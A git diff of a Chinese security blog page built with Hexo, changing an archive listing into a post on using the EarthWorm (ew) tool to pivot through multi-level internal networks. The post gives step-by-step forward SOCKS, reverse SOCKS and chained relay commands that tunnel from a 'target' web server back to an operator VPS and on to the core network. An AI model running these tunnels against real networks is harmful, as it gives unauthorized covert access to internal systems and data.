@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="内网穿透,">
 
 
 
@@ -86,16 +86,18 @@
 
 
 
-<meta name="description" content="一个兴趣使然的信息安全爱好者">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MaiKeFee|">
-<meta property="og:url" content="http://MaiKeFee.com/archives/page/3/index.html">
+<meta name="description" content="ew 快速穿透目标多级内网:简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内网数据库服务器,可正常访问公网 假设其内网ip为 192.168.32.170  win7 假设为自己公网的vps 假设其公网ip为 192.1">
+<meta name="keywords" content="内网穿透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用Ew轻松穿透目标多级内网(思维导图待整理)">
+<meta property="og:url" content="http://MaiKeFee.com/archives/a585a37c.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="一个兴趣使然的信息安全爱好者">
+<meta property="og:description" content="ew 快速穿透目标多级内网:简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内网数据库服务器,可正常访问公网 假设其内网ip为 192.168.32.170  win7 假设为自己公网的vps 假设其公网ip为 192.1">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-11T15:27:12.878Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MaiKeFee|">
-<meta name="twitter:description" content="一个兴趣使然的信息安全爱好者">
+<meta name="twitter:title" content="利用Ew轻松穿透目标多级内网(思维导图待整理)">
+<meta name="twitter:description" content="ew 快速穿透目标多级内网:简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内网数据库服务器,可正常访问公网 假设其内网ip为 192.168.32.170  win7 假设为自己公网的vps 假设其公网ip为 192.1">
 
 
 
@@ -125,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/page/3/">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/a585a37c.html">
 
 
 
 
 
-  <title>归档 | MaiKeFee|</title>
+  <title>利用Ew轻松穿透目标多级内网(思维导图待整理) | MaiKeFee|</title>
   
 
 
@@ -150,7 +152,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
     
 <a href="https://github.com/MaiKeFee" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
@@ -297,390 +299,374 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/a585a37c.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee|">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
-         
+          <h1 class="post-title" itemprop="name headline">利用Ew轻松穿透目标多级内网(思维导图待整理)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-11T23:10:12+08:00">
+                2019-09-11
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-11T23:27:12+08:00">
+                2019-09-11
+              </time>
+            
+          </span>
+
           
-        好! 目前共计 57 篇日志。 继续努力。
-      </span>
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
 
-      
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/后渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">后渗透</span>
+                  </a>
+                </span>
 
-        
-        
-        
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/后渗透/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
 
-        
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/后渗透/内网渗透/内网通道/" itemprop="url" rel="index">
+                    <span itemprop="name">内网通道</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
 
-        
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/archives/a585a37c.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/a585a37c.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+          
+             <span id="/archives/a585a37c.html" class="leancloud_visitors" data-flag-title="利用Ew轻松穿透目标多级内网(思维导图待整理)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/23c2d7c0.html" itemprop="url">
+          
+
+          
+            <div class="post-wordcount">
               
-                <span itemprop="name">Linux一键搭建SS</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.6k
+                </span>
               
-            </a>
-        
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-08T21:54:32+08:00" content="2019-09-08">
-          09-08
-        </time>
-      </div>
+              
+                <span class="post-meta-divider">|</span>
+              
 
-    </header>
-  </article>
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5
+                </span>
+              
+            </div>
+          
 
+          
 
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/3f60c38c.html" itemprop="url">
-              
-                <span itemprop="name">PHP常见绕过WAF方法汇总</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-08T20:06:26+08:00" content="2019-09-08">
-          09-08
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/67b2bdd.html" itemprop="url">
-              
-                <span itemprop="name">无关键字进行SQL注入</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-05T11:27:53+08:00" content="2019-09-05">
-          09-05
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
+        <h1 id="ew-快速穿透目标多级内网"><a href="#ew-快速穿透目标多级内网" class="headerlink" title="ew 快速穿透目标多级内网:"></a>ew 快速穿透目标多级内网:</h1><h2 id="简要环境说明"><a href="#简要环境说明" class="headerlink" title="简要环境说明:"></a>简要环境说明:</h2><h3 id="一层正向穿透-处于公网"><a href="#一层正向穿透-处于公网" class="headerlink" title="一层正向穿透(处于公网):"></a>一层正向穿透(处于公网):</h3><pre><code>win2008R2 假设为目标边界web服务器,可正常访问公网
 
-        
-        
-        
+假设其公网ip为 192.168.3.23
+假设其内网ip为 192.168.32.131
 
-        
-        
+win2008 假设为目标内网数据库服务器,可正常访问公网
+假设其内网ip为 192.168.32.170
 
-        
+win7 假设为自己公网的vps
+假设其公网ip为 192.168.3.232
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
+假设其内网ip为 192.168.32.169
+0x02 首先,利用ew做最简单的正向代理,其实就是大家最常用的所谓的ss:</code></pre><ul>
+<li><p>在 win2008R2 机器上执行</p>
+<pre><code>ew_for_Win.exe -s ssocksd -l 1080</code></pre></li>
+</ul>
+<p><strong>在win7上打开Proxifier根据上面监听的端口建立正常的socks代理即可</strong></p>
+<h2 id="一层反向穿透-处于内网可访问公网的情况"><a href="#一层反向穿透-处于内网可访问公网的情况" class="headerlink" title="一层反向穿透(处于内网可访问公网的情况)"></a>一层反向穿透(处于内网可访问公网的情况)</h2><blockquote>
+<p>假设目标机器就直接处在内网[没有公网ip,但可以访问公网],我们也可以利用ew进行反向socks5代理,然后直接在vps上就可以很方便的访问目标内网中的所有机器了:</p>
+</blockquote>
+<p>先在 win7上执行,等待目标反弹连接</p>
+<pre><code># ew_for_Win.exe -s rcsocks -l 1080 -e 1234</code></pre><p>在 win2008上执行,反弹socks5连接</p>
+<pre><code># ew_for_Win.exe -s  rssocks -d 192.168.3.232 -e 1234</code></pre><h2 id="复杂内网多层穿透-A-内网-B-内网-C-公网"><a href="#复杂内网多层穿透-A-内网-B-内网-C-公网" class="headerlink" title="复杂内网多层穿透(A(内网)-B(内网)-C(公网))"></a>复杂内网多层穿透(A(内网)-B(内网)-C(公网))</h2><blockquote>
+<p>实现复杂内网环境下的跨网段多级穿透:</p>
+</blockquote>
+<h3 id="第一种场景-内网机器不能访问公网"><a href="#第一种场景-内网机器不能访问公网" class="headerlink" title="第一种场景(内网机器不能访问公网)"></a>第一种场景(内网机器不能访问公网)</h3><ul>
+<li><p>内网机器不能访问公网,可通过能访问公网的机器把内网不能访问公网机器带出来,比较简单,如下:</p>
+<pre><code>假设win2008处在目标内网且不能访问公网但可以访问内网中的资源
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/5d509f57.html" itemprop="url">
-              
-                <span itemprop="name">反弹提权姿势集合&&部分免杀技巧</span>
-              
-            </a>
-        
-      </h2>
+而win2008R2这台机器上虽然有内网ip,但不能访问内网资源,好在win2008R2可以访问win2008
+这时我们想获取内网资源就可以这样干,先在win2008上开启socks代理服务,然后再在DMZ的        win2008R2连上内网的win2008的socks服务
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-05T10:42:30+08:00" content="2019-09-05">
-          09-05
-        </time>
-      </div>
+最后,通过win2008上的socks服务我们就可以轻松访问目标内网中的各种资源了,具体实现过程如        
+下</code></pre></li>
+</ul>
+<p>首先,在win2008上执行,意思就是在本地建立socks5代理,端口为1080</p>
+<pre><code># ew_for_Win.exe -s ssocksd -l 1080</code></pre><p>在到DMZ的win2008R2上执行,意思就是把来自外部的1090端口的流量转到内网192.168.32.170这台机器的1080端口上</p>
+<pre><code># ew_for_Win.exe -s lcx_tran -l 1090 -f 192.168.32.170 -g 1080</code></pre><p><strong>最后,再回到win7[vps]上去利用Proxifier建立正常的socks代理访问1090端口即可,访问vps的1090就相当于访问内网win2008的1080端口</strong></p>
+<h3 id="第二种场景-还是有些机器不能访问公网的情况"><a href="#第二种场景-还是有些机器不能访问公网的情况" class="headerlink" title="第二种场景(还是有些机器不能访问公网的情况)"></a>第二种场景(还是有些机器不能访问公网的情况)</h3><pre><code>假设win2008在内网且能访问公网但不能访问内网资源,而centos 5.1能访问内网资源但却无法访问公网,而win2008可以访问centos 5.1
 
-    </header>
-  </article>
-
-
-
+这试,我们要想获取内网资源,就可以通过win2008在centos 5.1和win7[vps]之间建立一条socks5    通道,实现过程比较简单,如下</code></pre><p>首先,在win7[实际中的vps]上执行,把来自外部的1080端口的流量转到本地的1379端口上</p>
+<pre><code># ew_for_Win.exe -s lcx_listen -l 1080 -e 1379</code></pre><p>此时回到centos 5.1上执行,在本地启动socks5代理并监听2345端口</p>
+<pre><code># chmod +x ew_for_Linux32
+# ./ew_for_Linux32 -s ssocksd -l 2345</code></pre><p>然后再到win2008上去执行,意思就是把win7[vps]的1379端口和centos 5.1的2345进行绑定,即建立socks5通道</p>
+<pre><code># ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1379 -f 192.168.32.169 -g 2345</code></pre><p>最后,在回到win7[vps]建立正常的socks代理访问即可,实际上就相当于访问win7的1080就相当于访问centos 5.1的2345端口,通过这种方式一样也可以把整个目标内网代理出来</p>
+<h3 id="第三种场景-多级内网轻松穿透"><a href="#第三种场景-多级内网轻松穿透" class="headerlink" title="第三种场景(多级内网轻松穿透)"></a>第三种场景(多级内网轻松穿透)</h3><blockquote>
+<p>假设win2008R2在内网[无公网ip]并在一个独立的内网段,win2008也处在目标内网,假设在另一个内网段,centos 5.1同样也处在内网,可又在另一个单独的内网段</p>
+</blockquote>
+<p>且win2008R2能访问win2008,win2008能访问centos 5.1,而centos 5.1能访问目标核心网,要实现层层穿透,访问到核心网资源,我们就可以这样</p>
+<p>先在win7[vps]上执行,把来自外部的1080端口流量转到本地的1235端口上</p>
+<pre><code># ew_for_Win.exe -s rcsocks -l 1080 -e 1235</code></pre><p>在win2008R2上执行,把win7[vps]的1235端口和内网win2008的3456端口绑定</p>
+<pre><code># ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1235 -f 192.168.32.170 -g 3456</code></pre><p>在win2008上执行,将来自外部的1236端口和本地的3456端口进行绑定</p>
+<pre><code># ew_for_Win.exe -s lcx_listen -l 3456 -e 1236</code></pre><p>在centos 5.1上执行,将本地的socks连接反弹到win2008的1236端口上,此时再回到win2008上看会提示”rssocks cmd_socket OK!”,说明通道已经建立成功</p>
+<pre><code># ./ew_for_Linux32 -s rssocks -d 192.168.32.170 -e 1236</code></pre><p><strong>最后,再回到win7[vps]上利用Proxifier访问本地的1080就相当于访问centos 5.1的1236端口,即可轻松获取核心网的数据</strong></p>
+<blockquote>
+<p>一点小结:<br>    关于ew,想必经常搞内网的朋友,都已经非常熟练了,这里也就不废话了,其实,关于ew本身在实战中还是比较实用的,在此也非常感谢作者的无私贡献,真心希望国内能多一些这样的人,总体来讲,在工具使用上并没有太多技术含量,关键还是要你自己根据目标的实际内网环境仔细弄清楚数据流向再针对性的用,上面一些简单应用场景中,表面看着貌似挺复杂的,其实真正理解以后,都非常简单,深刻搞清楚这些最基本的东西你才有可能灵活应用,什么都是如此,总是停留在’用’别人的工具上,自己没有一点儿的独立分析和想法,是很难有长进的,后续有空会再简单介绍下关于Termite跳板机使用</p>
+</blockquote>
+<p> 引用及整理来自:</p>
+<pre><code>https://klionsec.github.io/2017/08/05/ew-tunnel/</code></pre>
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/e3266f5b.html" itemprop="url">
-              
-                <span itemprop="name">Win杀软进程在线对比-提权辅助</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-04T21:08:50+08:00" content="2019-09-04">
-          09-04
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/38f7c93b.html" itemprop="url">
-              
-                <span itemprop="name">PPTP口令爆破</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-04T17:00:36+08:00" content="2019-09-04">
-          09-04
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/fcea265e.html" itemprop="url">
-              
-                <span itemprop="name">网络设备的默认密码(交换机、路由器、安全设备)</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-04T09:24:57+08:00" content="2019-09-04">
-          09-04
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/d0f5ccf3.html" itemprop="url">
-              
-                <span itemprop="name">SQL_Sever手工注入及技术总结</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-03T20:59:49+08:00" content="2019-09-03">
-          09-03
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/15af7f29.html" itemprop="url">
-              
-                <span itemprop="name">常见未授权访问漏洞总结</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-03T17:03:21+08:00" content="2019-09-03">
-          09-03
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/f71d256c.html" itemprop="url">
-              
-                <span itemprop="name">Pythton渗透测试工具库总纲</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-09-03T15:44:18+08:00" content="2019-09-03">
-          09-03
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+   <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束❤感谢阅读-------------</div>
+    
+</div>
+    
+ </div>
+     <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>利用Ew轻松穿透目标多级内网(思维导图待整理)</p>
+  <p><span>文章作者:</span>MaiKeFee</p>
+  <p><span>发布时间:</span>2019年09月11日</p>
+  <p><span>最后更新:</span>2019年09月11日</p>
+  <p><span>原始链接:</span><a href="/archives/a585a37c.html" title="利用Ew轻松穿透目标多级内网(思维导图待整理)">http://MaiKeFee.com/archives/a585a37c.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/a585a37c.html" aria-label="复制成功！"></i></span>
+  </p>
+  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+    
+</div>
+    
+
+    
+
+   
+
+  <footer class="post-footer">
+
+    
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网穿透/" rel="tag"><i class="fa fa-tag"></i> 内网穿透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/f69de167.html" rel="next" title="Ssh转发流量的四种姿势">
+                <i class="fa fa-chevron-left"></i> Ssh转发流量的四种姿势
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+          
+        </div>
+      
+ 
+      
+      
+    </footer>
+
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/archives/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/6/">6</a><a class="extend next" rel="next" href="/archives/page/4/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -688,6 +674,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -708,8 +701,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -832,6 +834,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ew-快速穿透目标多级内网"><span class="nav-number">1.</span> <span class="nav-text">ew 快速穿透目标多级内网:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简要环境说明"><span class="nav-number">1.1.</span> <span class="nav-text">简要环境说明:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一层正向穿透-处于公网"><span class="nav-number">1.1.1.</span> <span class="nav-text">一层正向穿透(处于公网):</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一层反向穿透-处于内网可访问公网的情况"><span class="nav-number">1.2.</span> <span class="nav-text">一层反向穿透(处于内网可访问公网的情况)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复杂内网多层穿透-A-内网-B-内网-C-公网"><span class="nav-number">1.3.</span> <span class="nav-text">复杂内网多层穿透(A(内网)-B(内网)-C(公网))</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一种场景-内网机器不能访问公网"><span class="nav-number">1.3.1.</span> <span class="nav-text">第一种场景(内网机器不能访问公网)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二种场景-还是有些机器不能访问公网的情况"><span class="nav-number">1.3.2.</span> <span class="nav-text">第二种场景(还是有些机器不能访问公网的情况)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三种场景-多级内网轻松穿透"><span class="nav-number">1.3.3.</span> <span class="nav-text">第三种场景(多级内网轻松穿透)</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -988,6 +1006,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1548,13 +1570,13 @@
       var articles = db.collection('articles')
 
       //https://hexo.io/zh-tw/docs/variables.html
-      var isPost = ''.length > 0
+      var isPost = '利用Ew轻松穿透目标多级内网(思维导图待整理)'.length > 0
       var isArchive = '' === 'true'
       var isCategory = ''.length > 0
       var isTag = ''.length > 0
 
       if (isPost) { //is article page
-        var title = ''
+        var title = '利用Ew轻松穿透目标多级内网(思维导图待整理)'
         var doc = articles.doc(title)
 
         getCount(doc, true).then(appendCountTo($('.post-meta')))
@@ -1562,7 +1584,7 @@
       else if (!isArchive && !isCategory && !isTag) { //is index page
         var titles = [] //array to titles
 
-        var postsstr = 'titles.push("Linux一键搭建SS");titles.push("PHP常见绕过WAF方法汇总");titles.push("无关键字进行SQL注入");titles.push("反弹提权姿势集合&&部分免杀技巧");titles.push("Win杀软进程在线对比-提权辅助");titles.push("PPTP口令爆破");titles.push("网络设备的默认密码(交换机、路由器、安全设备)");titles.push("SQL_Sever手工注入及技术总结");titles.push("常见未授权访问漏洞总结");titles.push("Pythton渗透测试工具库总纲");' //if you have a better way to get titles of posts, please change it
+        var postsstr = '' //if you have a better way to get titles of posts, please change it
         eval(postsstr)
 
         var promises = titles.map(function (title) {
